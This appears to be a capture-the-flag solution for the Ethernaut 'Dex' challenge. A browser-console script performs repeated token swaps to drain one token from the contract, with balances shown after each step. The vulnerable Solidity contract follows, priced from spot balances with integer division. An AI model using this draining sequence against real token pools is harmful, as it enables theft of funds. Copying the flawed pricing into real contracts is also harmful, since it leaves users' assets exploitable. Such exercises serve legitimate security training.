```javascript
// Reference: https://medium.com/@this_post/ethernaut-22-dex-modified-version-writeups-4330c33a0743
await contract.approve(contract.address, web3.utils.toBN(200e18))
await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
// 10
await contract.swap(await contract.token1(), await contract.token2(), 10)
await contract.balanceOf(await contract.token2(), player).then(x=>x.toNumber())
// 20
await contract.swap(await contract.token2(), await contract.token1(), 20)
await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
// 24
await contract.swap(await contract.token1(), await contract.token2(), 24)
await contract.balanceOf(await contract.token2(), player).then(x=>x.toNumber())
// 30
await contract.swap(await contract.token2(), await contract.token1(), 30)
await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
// 41
await contract.swap(await contract.token1(), await contract.token2(), 41)
await contract.balanceOf(await contract.token2(), player).then(x=>x.toNumber())
// 65(65 * 110 / 45 = 158, Dex balance not enough, so next swap only pay 45 token2 and token1 will be drained)
await contract.swap(await contract.token2(), await contract.token1(), 45)
await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
// 110
await contract.balanceOf(await contract.token1(), contract.address).then(x=>x.toNumber())
// 0
await contract.balanceOf(await contract.token2(), player).then(x=>x.toNumber())
// 20
await contract.balanceOf(await contract.token2(), contract.address).then(x=>x.toNumber())
// 90
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```
